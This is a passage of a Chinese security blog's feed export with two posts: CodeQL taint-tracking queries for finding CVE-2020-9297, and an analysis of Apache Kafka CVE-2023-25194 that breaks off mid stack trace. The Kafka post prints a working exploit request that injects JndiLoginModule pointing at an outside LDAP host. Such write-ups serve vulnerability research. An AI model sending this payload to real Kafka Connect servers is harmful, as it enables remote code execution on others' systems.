进行漏洞分析</h2><h3 id="3-1-Sink"><a href="#3-1-Sink" class="headerlink" title="3.1 Sink"></a>3.1 Sink</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSink(DataFlow::Node sink) &#123; </span><br><span class="line">    exists(</span><br><span class="line">        MethodAccess ma|</span><br><span class="line">        ma.getMethod().getDeclaringType().hasQualifiedName(&quot;javax.validation&quot;, &quot;ConstraintValidatorContext&quot;) </span><br><span class="line">        and ma.getMethod().hasName(&quot;buildConstraintViolationWithTemplate&quot;)</span><br><span class="line">        &#x2F;&#x2F; and ma.getMethod().getParameter(0) &#x3D; sink.asParameter()</span><br><span class="line">        and ma.getArgument(0) &#x3D; sink.asExpr()</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>Tips: Method.getParameter() = sink.asParameter() <strong>VS</strong> MethodAccess.getArgument() = sink.asExpr()</p></blockquote><ul><li>sink.asParameter 最终的结果是buildConstraintViolationWithTemplate 声明时候的参数</li><li>sink.asExpr 最终的结果是buildConstraintViolationWithTemplate 调用时候的参数<br>因为javax.validation.ConstraintValidatorContext#buildConstraintViolationWithTemplate 是在依赖库中，因此需要使用sink.asExpr，如果都是源码，那么asExpr 可以当作是asParameter的TiantFlow上一个节点，结果没有区别；如果是在依赖库中，则需要用sink.asExpr。</li></ul><h3 id="3-2-Source"><a href="#3-2-Source" class="headerlink" title="3.2 Source"></a>3.2 Source</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">private class VailidatorSource extends RemoteFlowSource &#123;</span><br><span class="line">    &#x2F;&#x2F; isValid 参数1 可控</span><br><span class="line">    VailidatorSource()&#123;</span><br><span class="line">        exists(</span><br><span class="line">            Method m | m.getParameter(0) &#x3D; this.asParameter() |</span><br><span class="line">            m.getDeclaringType().getASourceSupertype().hasQualifiedName(&quot;javax.validation&quot;, &quot;ConstraintValidator&quot;)</span><br><span class="line">            and m.hasName(&quot;isValid&quot;)</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">    override string getSourceType() &#123; result &#x3D; &quot;validator&quot; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>Tips: 此处为何不用MethodAccess = this.asExpr ?<br>Method 不一定会有对应的MethodAccess</p></blockquote><h3 id="3-3-TaintTracking-configuration"><a href="#3-3-TaintTracking-configuration" class="headerlink" title="3.3 TaintTracking configuration"></a>3.3 TaintTracking configuration</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">class VulConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">    &#x2F;&#x2F; class VulConfig extends DataFlow::Configuration &#123;</span><br><span class="line">    VulConfig() &#123; this &#x3D; &quot;jaas vul&quot; &#125;</span><br><span class="line">    override int fieldFlowBranchLimit() &#123; result &#x3D; 100 &#125;</span><br><span class="line">    override int explorationLimit() &#123; result &#x3D; 10 &#125;</span><br><span class="line">    override predicate isSource(DataFlow::Node src) &#123; src instanceof VailidatorSource &#125;</span><br><span class="line">    override predicate isSink(DataFlow::Node sink) &#123; </span><br><span class="line">...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where config.hasFlowPath(source, sink)</span><br><span class="line">&#x2F;&#x2F; select source, &quot;Data flow to $@.&quot;, sink, sink.toString()</span><br><span class="line">select sink.getNode(), source, sink, &quot;$@.&quot;, source.getNode(), &quot;user input&quot;</span><br></pre></td></tr></table></figure><p>**执行，但是发现结果为空</p><p><img src="/images/pasted-429.png" alt="upload successful"></p><h3 id="3-4-Partial-Flow-调试"><a href="#3-4-Partial-Flow-调试" class="headerlink" title="3.4 Partial Flow 调试"></a>3.4 Partial Flow 调试</h3><p>具体参考CodeQL官方的说明文档【8】，Partial Flow可以用于数据流的调试</p><h4 id="3-4-1-自查"><a href="#3-4-1-自查" class="headerlink" title="3.4.1 自查"></a>3.4.1 自查</h4><p>官方给了两个自查的手段</p><h5 id="3-4-1-1-Checking-sources-and-sinks"><a href="#3-4-1-1-Checking-sources-and-sinks" class="headerlink" title="3.4.1.1 Checking sources and sinks"></a>3.4.1.1 Checking sources and sinks</h5><p>检查source 和sink，单独quick evaluate 看看结果是否符合预期。</p><h5 id="3-4-1-2-fieldFlowBranchLimit"><a href="#3-4-1-2-fieldFlowBranchLimit" class="headerlink" title="3.4.1.2 fieldFlowBranchLimit"></a>3.4.1.2 fieldFlowBranchLimit</h5><p>官方解释：</p><blockquote><p>Gets the virtual dispatch branching limit when calculating field flow. This can be overridden to a smaller value to improve performance (a value of 0 disables field flow), or a larger value to get more results.<br>获取计算字段流时的虚拟调度分支限制。可以将其覆盖为较小的值以提高性能（0 将禁用字段流），或将其覆盖为较大的值以获得更多结果。</p></blockquote><p>这里的Field是指的Object 的Field，还是任何污点节点？没懂</p><h4 id="3-4-2-Partial-Flow"><a href="#3-4-2-Partial-Flow" class="headerlink" title="3.4.2 Partial Flow"></a>3.4.2 Partial Flow</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;** </span><br><span class="line">@kind path-problem</span><br><span class="line">*&#x2F;</span><br><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.TaintTracking</span><br><span class="line">import DataFlow::PartialPathGraph &#x2F;&#x2F; this is different!</span><br><span class="line"></span><br><span class="line">class MyTaintTrackingConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">    MyTaintTrackingConfig() &#123; ... &#125; &#x2F;&#x2F; same as before</span><br><span class="line">    override predicate isSource(DataFlow::Node source) &#123; ... &#125; &#x2F;&#x2F; same as before</span><br><span class="line">    override predicate isSink(DataFlow::Node sink) &#123; ... &#125; &#x2F;&#x2F; same as before</span><br><span class="line">    override int explorationLimit() &#123; result &#x3D;  10&#125; &#x2F;&#x2F; this is different!</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from MyTaintTrackingConfig cfg, DataFlow::PartialPathNode source, DataFlow::PartialPathNode sink</span><br><span class="line">where cfg.hasPartialFlow(source, sink, _)</span><br><span class="line">select sink, source, sink, &quot;Partial flow from unsanitized user data&quot;</span><br></pre></td></tr></table></figure><ul><li>import 的是DataFlow::PartialPathGraph</li><li>explorationLimit 个人理解是最大污点传播深度</li></ul><p>官方DataFlow::hasPartialFlow 的解释</p><blockquote><p>Holds if there is a partial data flow path from source to node. The approximate distance between node and the closest source is dist and is restricted to be less than or equal to explorationLimit(). This predicate completely disregards sink definitions.<br>This predicate is intended for data-flow exploration and debugging and may perform poorly if the number of sources is too big and/or the exploration limit is set too high without using barriers.</p></blockquote><ul><li>hasPartialFlow 的第三个参数也是要不大于conf内的explorationLimit</li><li>忽略sink 点约束</li><li>source 节点过多/explorationLimit 过大都可能导致性能问题</li></ul><h4 id="3-4-3-实战定位"><a href="#3-4-3-实战定位" class="headerlink" title="3.4.3 实战定位"></a>3.4.3 实战定位</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * @name CVE-2020-9297-partial</span><br><span class="line"> * @kind path-problem</span><br><span class="line"> *&#x2F;</span><br><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.DataFlow</span><br><span class="line">import semmle.code.java.dataflow.FlowSources</span><br><span class="line">import DataFlow::PartialPathGraph</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">private class VailidatorSource extends RemoteFlowSource &#123;</span><br><span class="line">    &#x2F;&#x2F; isValid 参数1 可控</span><br><span class="line">    VailidatorSource()&#123;</span><br><span class="line">        exists(</span><br><span class="line">            Method m | m.getParameter(0) &#x3D; this.asParameter() |</span><br><span class="line">            m.getDeclaringType().getASourceSupertype().hasQualifiedName(&quot;javax.validation&quot;, &quot;ConstraintValidator&quot;)</span><br><span class="line">            and m.hasName(&quot;isValid&quot;)</span><br><span class="line">            &#x2F;&#x2F; 增加约束条件</span><br><span class="line">            and m.getFile().getBaseName() &#x3D; &quot;SchedulingConstraintValidator.java&quot;</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">    override string getSourceType() &#123; result &#x3D; &quot;validator&quot; &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class VulConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">    &#x2F;&#x2F; class VulConfig extends DataFlow::Configuration &#123;</span><br><span class="line">    VulConfig() &#123; this &#x3D; &quot;vul&quot; &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; override int fieldFlowBranchLimit() &#123; result &#x3D; 100 &#125;</span><br><span class="line"></span><br><span class="line">    override int explorationLimit() &#123; result &#x3D; 8 &#125;</span><br><span class="line"></span><br><span class="line">    override predicate isSource(DataFlow::Node src) &#123; src instanceof VailidatorSource &#125;</span><br><span class="line"></span><br><span class="line">    override predicate isSink(DataFlow::Node sink) &#123; </span><br><span class="line">        exists(</span><br><span class="line">        MethodAccess ma|</span><br><span class="line">        ma.getMethod().getDeclaringType().getASupertype*().hasQualifiedName(&quot;javax.validation&quot;, &quot;ConstraintValidatorContext&quot;) </span><br><span class="line">        and ma.getMethod().hasName(&quot;buildConstraintViolationWithTemplate&quot;)</span><br><span class="line">        and ma.getArgument(0) &#x3D; sink.asExpr()</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">from VulConfig config, DataFlow::PartialPathNode source, DataFlow::PartialPathNode sink</span><br><span class="line">where config.hasPartialFlow(source, sink, _)</span><br><span class="line">select sink, source, sink, &quot;Partial flow from unsanitized user data&quot;</span><br></pre></td></tr></table></figure><p>用VSCode run，或者<code>codeql database analyze titus-control-plane-db --format=sarif-latest dev/titus/partial.ql -o titus.sarif</code>，实际运行会发现只占用了单核，</p><blockquote><p>Tips: VSCode CodeQL 插件通过启动query server进程来执行对应的查询，不用单独起java进程，可以在插件配置内配置Threads 和 Mem大小，但是每个查询实际上还是单进程的。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql-home/codeql/tools/osx64/java-aarch64/bin/java -Xmx2048M --add-modules jdk.unsupported -cp codeql-home/codeql/tools/codeql.jar com.semmle.cli2.CodeQL execute query-server2 --threads 2 -J-Xmx2048M --off-heap-ram=2048 --evaluator-log xxx/GitHub.vscode-codeql/structured-evaluator-log.json --evaluator-log-level 5 --debug --tuple-counting -v --log-to-stderr</span><br></pre></td></tr></table></figure><h4 id="3-4-4-简化"><a href="#3-4-4-简化" class="headerlink" title="3.4.4 简化"></a>3.4.4 简化</h4><p>拷贝SchedulingConstraintValidator.java 并做适当语法修改。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="comment">// import static com.netflix.titus.common.util.CollectionsExt.asSet;</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SchedulingConstraintValidator</span> <span class="keyword">implements</span> <span class="title">ConstraintValidator</span>&lt;<span class="title">SchedulingConstraintValidator</span>.<span class="title">SchedulingConstraint</span>, <span class="title">Map</span>&lt;<span class="title">String</span>, <span class="title">String</span>&gt;&gt; </span>&#123;</span><br><span class="line">...</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Set&lt;String&gt; CONSTRAINT_NAMES = <span class="keyword">new</span> HashSet&lt;&gt;(Arrays.asList(<span class="keyword">new</span> String[]&#123;<span class="string">&quot;uniquehost&quot;</span>, <span class="string">&quot;exclusivehost&quot;</span>, <span class="string">&quot;zonebalance&quot;</span>,</span><br><span class="line">    <span class="string">&quot;activehost&quot;</span>, <span class="string">&quot;availabilityzone&quot;</span>, <span class="string">&quot;machineid&quot;</span>, <span class="string">&quot;machinegroup&quot;</span>, <span class="string">&quot;machinetype&quot;</span>, <span class="string">&quot;toleration&quot;</span>&#125;));</span><br><span class="line">...</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isValid</span><span class="params">(Map&lt;String, String&gt; value, ConstraintValidatorContext context)</span> </span>&#123;</span><br><span class="line">        Set&lt;String&gt; namesInLowerCase = value.keySet().stream().map(String::toLowerCase).collect(Collectors.toSet());</span><br><span class="line">        HashSet&lt;String&gt; unknown = <span class="keyword">new</span> HashSet&lt;&gt;(namesInLowerCase);</span><br><span class="line">        unknown.removeAll(CONSTRAINT_NAMES);</span><br><span class="line">        <span class="keyword">if</span> (unknown.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        context.buildConstraintViolationWithTemplate(<span class="string">&quot;Unrecognized constraints &quot;</span> + unknown)</span><br><span class="line">                .addConstraintViolation().disableDefaultConstraintViolation();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>option 文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;semmle-extractor-options: --javac-args -cp $&#123;testdir&#125;&#x2F;..&#x2F;..&#x2F;stub&#x2F;hibernate-validator-5.4.3.Final.jar:$&#123;testdir&#125;&#x2F;..&#x2F;..&#x2F;stub&#x2F;validation-api-1.1.0.Final.jar</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql <span class="built_in">test</span> run .</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-433.png" alt="upload successful"></p><p>可以看到在…+… 处污染链断了</p><h4 id="3-4-5-隐式参数"><a href="#3-4-5-隐式参数" class="headerlink" title="3.4.5 隐式参数"></a>3.4.5 隐式参数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">override predicate isAdditionalTaintStep(DataFlow::Node pred, DataFlow::Node succ) &#123;</span><br><span class="line">    pred.asExpr() &#x3D; succ.asExpr().(AddExpr).getAnOperand()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">override predicate allowImplicitRead(DataFlow::Node node, DataFlow::ContentSet c) &#123;</span><br><span class="line">    super.allowImplicitRead(node, c)</span><br><span class="line">    or this.isAdditionalTaintStep(node, _)</span><br><span class="line">    and (</span><br><span class="line">        c instanceof DataFlow::ArrayContent</span><br><span class="line">        or c instanceof DataFlow::CollectionContent</span><br><span class="line">        or c instanceof DataFlow::MapValueContent</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试环境<br><img src="/images/pasted-434.png" alt="upload successful"></p><p><img src="/images/pasted-435.png" alt="upload successful"></p><h2 id="0x04-思考"><a href="#0x04-思考" class="headerlink" title="0x04 思考"></a>0x04 思考</h2><ol><li><p>Sink点ConstraintValidatorContext.buildConstraintViolationWithTemplate 背后的故事，有一系列的漏洞，<a href="https://securitylab.github.com/research/bean-validation-RCE/">参考【6】</a></p></li><li><p>summersec师傅和l3yx师傅得到的是不同的sink点和路径，其他剩余的路径呢？<br><img src="/images/pasted-436.png" alt="upload successful"></p></li><li><p>CTF题目当时用的codeql版本较低，还存在HashSet/Getter&amp;Setter 之类的传播问题，可以参考summersec师傅和l3yx师傅的文章</p></li></ol><h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><ul><li>[1] <a href="https://sumsec.me/2022/GitHub%20Java%20CodeQL%20CTF.html">GitHub Java CodeQL CTF (by:summersec)</a></li><li>[2] <a href="https://l3yx.github.io/2022/05/14/GitHub-Security-Lab-CTF-CodeQL-and-Chill/">GitHub Security Lab CTF: CodeQL and Chill (by:l3yx)</a></li><li>[3] <a href="https://xz.aliyun.com/t/7979">使用 CodeQL 挖掘 CVE-2020-9297 (by:syang)</a></li><li>[4] <a href="https://securitylab.github.com/advisories/GHSL-2020-028-netflix-titus/">GHSL-2020-028: Server-Side Template Injection in Netflix Titus (by:pwntester)</a></li><li>[5] <a href="https://xz.aliyun.com/t/8299">Nexus3 EL表达式注入浅析(CVE-2020-10199)</a></li><li>[6] <a href="https://securitylab.github.com/research/bean-validation-RCE/">Bean Stalking: Growing Java beans into RCE (by:pwntester)</a></li><li>[7] <a href="https://xz.aliyun.com/t/10693">Java安全-深入BeanValidation的RCE漏洞</a></li><li>[8] <a href="https://codeql.github.com/docs/writing-codeql-queries/debugging-data-flow-queries-using-partial-flow/">Debugging data-flow queries using partial flow</a></li><li>[8] <a href="https://beanvalidation.org/latest-draft/spec/#introduction">Bean Validation specification</a></li><li>[9] <a href="https://segmentfault.com/a/1190000023471742">Spring Validation最佳实践及其实现原理</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;summersec师傅的文章【1】不错，主要参考师傅的文章&lt;/p&gt;
&lt;h2 id=&quot;0x01-背景&quot;&gt;&lt;a href=&quot;#0x01-背景&quot; class=&quot;headerlink&quot; title=&quot;0x01 背景&quot;&gt;&lt;/a&gt;0x01 背景&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;GitHub Security Lab CTF&lt;/strong&gt; &lt;/p&gt;
&lt;p&gt;第四题：&lt;a href=&quot;https://securitylab.github.com/ctf/codeql-and-chill/&quot;&gt;GitHub Security Lab CTF 4: CodeQL and Chill - The Java Edition&lt;/a&gt;&lt;br&gt;相关漏洞：&lt;a href=&quot;https://securitylab.github.com/advisories/GHSL-2020-028-netflix-titus/&quot;&gt;CVE-2020-9297&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://drive.google.com/open?id=10ju0t2QZjsKI8qrAqwzsPA3K-lBgqPVF&quot;&gt;CodeQL database 下载地址&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;CVE-2020-9297&lt;/strong&gt; &lt;/p&gt;
&lt;p&gt;祖师爷pwntester 发现的，$3000，然后被拿来出题。。。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/pasted-424.png&quot; alt=&quot;upload successful&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CodeQL" scheme="http://m0d9.me/categories/CodeQL/"/>
    
    
    <category term="Java" scheme="http://m0d9.me/tags/Java/"/>
    
    <category term="CodeQL" scheme="http://m0d9.me/tags/CodeQL/"/>
    
    <category term="CVE-2020-9297" scheme="http://m0d9.me/tags/CVE-2020-9297/"/>
    
    <category term="BeanValidation" scheme="http://m0d9.me/tags/BeanValidation/"/>
    
  </entry>
  
  <entry>
    <title>Apache Kafka CVE-2023-25194 漏洞分析</title>
    <link href="http://m0d9.me/2023/02/17/Apache-Kafka-CVE-2023-25194-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://m0d9.me/2023/02/17/Apache-Kafka-CVE-2023-25194-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2023-02-17T07:50:00.000Z</published>
    <updated>2023-12-28T08:51:56.371Z</updated>
    
    <content type="html"><![CDATA[<p>漏洞的原理不复杂，背后的故事却很有意思。</p><h2 id="0x01-漏洞趣闻"><a href="#0x01-漏洞趣闻" class="headerlink" title="0x01 漏洞趣闻"></a>0x01 漏洞趣闻</h2><p>有意思的Credit，<br><img src="/images/pasted-401.png" alt="upload successful"></p><p>大致理理时间线</p><ol><li>2022.04.04——jarij 在hackone上报给了个漏洞给Aiven Ltd，具体参考 <a href="https://hackerone.com/reports/1529790%E3%80%82Aiven">https://hackerone.com/reports/1529790。Aiven</a> 是一个云服务器提供商，包装了kafka产品，用到了debezium mysql的connector，都知道mysql jdbc connector参数如果能控制是有反序列化风险的，但这里漏洞还不是这个触发点，而是database.history.producer.sasl.jaas.config这个参数可以指定JndiLoginModule 造成JNDI 注入。</li><li>2022.11.08——漏洞详情公开。</li><li>(时间未知)——4ra1n 和Y4tacker 两位师傅找到了个Apache 其他产品的漏洞，和kafka有关，最终定位为kafka的问题（细节未确认）</li><li>2023.02.08——Kafka CVE公告，参考<a href="https://kafka.apache.org/cve-list">https://kafka.apache.org/cve-list</a> ，官方也给出了poc的重要参数xxx.overwrite.sasl.jaas.config。</li><li>2023.02.09——奇安信复现 <a href="https://nox.qianxin.com/article/518%E3%80%82">https://nox.qianxin.com/article/518。</a></li></ol><a id="more"></a><p>以至于到现在大家都以为是hackone的历史老洞，需要依赖debezium mysql connector，因此没有多少重视，都忽略了Kafka CVE的描述。。。</p><p><img src="/images/pasted-402.png" alt="upload successful"></p><p>实际这个漏洞的描述如官方所述，通过设置参数xxx.overwrite.sasl.jaas.config，而不是database.history.producer.sasl.jaas.config，不需要依赖，而且自带CB反序列化链，影响比HackOne 的洞要严重很多。</p><h2 id="0x02-漏洞环境"><a href="#0x02-漏洞环境" class="headerlink" title="0x02 漏洞环境"></a>0x02 漏洞环境</h2><p>执行如下命令启动一个Kafka Server 3.3.2：</p><p>vulhub/kafka/CVE-2023-25194 (待上传)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker build . -t vulhub/kafka:3.3.2</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;connectors HTTP&#x2F;1.1</span><br><span class="line">Host: xxxx:8083</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;109.0.0.0 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 1109</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;: &quot;test&quot;, </span><br><span class="line">   &quot;config&quot;:</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;connector.class&quot;:&quot;FileStreamSource&quot;,</span><br><span class="line">        &quot;file&quot;:&quot;test.txt&quot;,</span><br><span class="line">        &quot;tasks.max&quot;:&quot;1&quot;,</span><br><span class="line">        &quot;topic&quot;:&quot;quickstart-events&quot;,</span><br><span class="line">        &quot;producer.override.security.protocol&quot;:&quot;SASL_PLAINTEXT&quot;,</span><br><span class="line">        &quot;producer.override.sasl.mechanism&quot;:&quot;PLAIN&quot;,</span><br><span class="line">        &quot;producer.override.sasl.jaas.config&quot;:&quot;com.sun.security.auth.module.JndiLoginModule required user.provider.url&#x3D;\&quot;ldap:&#x2F;&#x2F;kafka2.1.dns.m0d9.me\&quot; useFirstPass&#x3D;\&quot;true\&quot; serviceName&#x3D;\&quot;x\&quot; debug&#x3D;\&quot;true\&quot; group.provider.url&#x3D;\&quot;xxx\&quot;;&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-1-漏洞分析"><a href="#3-1-漏洞分析" class="headerlink" title="3.1 漏洞分析"></a>3.1 漏洞分析</h3><p><img src="/images/pasted-403.png" alt="upload successful"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">attemptAuthentication:502, JndiLoginModule (com.sun.security.auth.module)</span><br><span class="line">login:303, JndiLoginModule (com.sun.security.auth.module)</span><br><span class="line">invoke:747, LoginContext (javax.security.auth.login)</span><br><span class="line">run:672, LoginContext$4 (javax.security.auth.login)</span><br><span class="line">run:670, LoginContext$4 (javax.security.auth.login)</span><br><span class="line">doPrivileged:-1, AccessController (java.security)</span><br><span class="line">invokePriv:670, LoginContext (javax.security.auth.login)</span><br><span class="line">login:581, LoginContext (javax.security.auth.login)</span><br><span class="line">login:60, AbstractLogin (org.apache.kafka.common.security.authenticator)</span><br><span class="line">&lt;init&gt;:62, LoginManager (org.apache.kafka.common.security.authenticator)</span><br><span class="line">acquireLoginManager:105, LoginManager (org.apache.kafka.common.security.authenticator)</span><br><span class="line">configure:170, SaslChannelBuilder (org.apache.kafka.common.network)</span><br><span class="line">create:192, ChannelBuilders (org.apache.kafka.common.network)</span><br><span class="line">clientChannelBuilder:81, ChannelBuilders (org.apache.kafka.common.network)</span><br><span class="line">createChannelBuilder:105, ClientUtils (org.apache.kafka.clients)</span><br><span class="line">newSender:517, KafkaProducer (org.apache.kafka.clients.producer)</span><br><span class="line">&lt;init&gt;:460, KafkaProducer (org.apache.kafka.clients.producer)</span><br><span class="line">&lt;init&gt;:291, KafkaProducer (org.apache.kafka.clients.producer)</span><br><span class="line">&lt;init&gt;:274, KafkaProducer (org.apache.kafka.clients.producer)</span><br><span class="line">doBuild:1348, Worker$SourceTaskBuilder (org.apache.kafka.connect.runtime)</span><br><span 